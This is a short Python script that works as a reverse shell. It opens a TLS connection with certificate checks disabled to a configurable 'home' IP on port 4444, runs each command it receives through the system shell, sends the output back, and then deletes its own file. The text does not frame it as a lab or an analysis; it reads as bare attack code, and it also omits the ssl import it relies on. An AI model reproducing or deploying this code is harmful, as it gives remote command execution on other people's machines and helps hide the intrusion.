import socket
import subprocess
import os
import sys

home_ip = "127.0.0.1"  # Replace with your home IP address
home_port = 4444

context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE  # accept self-signed certs

s = socket.socket()
secure_sock = context.wrap_socket(s, server_hostname=home_ip)
secure_sock.connect((home_ip, home_port))

while True:
    command = secure_sock.recv(1024).decode(errors='ignore')
    if command.lower() == "exit":
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    secure_sock.sendall(output)

secure_sock.close()
os.remove(__file__)
os._exit(0)